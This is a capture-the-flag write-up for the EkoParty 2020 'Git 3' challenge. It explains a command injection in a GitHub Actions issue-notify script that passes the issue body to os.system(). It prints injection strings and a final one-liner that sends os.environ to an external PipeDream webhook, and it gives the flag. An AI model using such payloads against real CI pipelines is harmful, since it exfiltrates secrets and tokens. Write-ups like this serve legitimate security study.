# Env Writeup

EkoParty CTF 2020 Git 3

## Prompt

Not too sure of the original prompt, however I did not need it.

## Solution

After [the second part of the git challenge saga](../docs), we have gotten a new repository with some new github actions. We know, before analyzing these however, that:

 - Issues filed to the `ekolabs` repo will be 'moved' to the `ekoparty-internal` repo. 
 - We control content in the submitted issues, and this is copied to the new issues in `ekoparty-internal` repo.

That's good information. Now let's examine the actions for this repo - we are provided an [issue-notify.py](issue-notify.py) and an [issue-notify.yml](issue-notify.yml). At first glance at the python script, we see two interesting things:

1. The script checks `if 'very important' in title:` before executing an `os.system()` call
2. The script runs our 'user input' (the body of the issue) in the call to `os.system()`.

What can we do with this? If we put "very important" in the title, and we include a specific body, we can execute arbitrary commands using the call to `os.system()`. How so? 

```python
os.system('echo "%s" > /tmp/%s' % (body, notify_id))
```

This line is vulnerable, as the `body` of our issue is placed in it's entirety in the place of the first `%s`, so if we were to enter `"`, this would become:

```python
os.system('echo """ > /tmp/%s' % (body, notify_id))
```

Which would echo an empty string to `/tmp/$notify_id`. This will not do, however, so we need something more complicated to do the trick. Maybe something like sending `body` of `"; sleep 10; echo "` will do better, as it will turn into:

```python
os.system('echo ""; sleep 10; echo "" > /tmp/%s' % (body, notify_id))
```
> Note: I did not come up with this all in one shot, I had to prototype it. I did this with the [test.py](test.py) script.

This will execute the `sleep 10` just fine. We have code execution now, we just need to find out what to do with it. The challenge name indicates the flag is likely stored in the environment variables so we know where to look, but how to extract this info from the server?

To determine what tools are available for use, I looked to [issue-notify.yml](issue-notify.yml):

```yml
    runs-on: ubuntu-latest
    steps:
      
      ...

      - name: Set up Python3
        if: ${{ success() }}
        uses: actions/setup-python@v1
        with:
        	python-version: "3.7"
```

We at least have a default installation of Python 3.7 to work with, that's pretty good. To make use of that, we will need to have somewhere to send it, and that's where a webhook tester, something that captures and displays (in this case) http requests sent to it. For this I used PipeDream. It provides you with a link to send requests to.

From there, it's as easy as getting the environment variables `os.environ`, and sending them home to PipeDream with a little one-line bash / python script of sorts:

```bash
" && python3 -c "import requests; message = {'message': str(os.environ)}; r = requests.post('https://e756afb172e9b06dad06e8cfeff52a32.m.pipedream.net',data = message);" && echo "
```

That's all there is to it: sending that returns [envs](envs) to PipeDream, and it's right in there. 

```
EKO{b08bb4814d581e6a91b3501f8c63c7786fe624e1}
```

~ Lyell Read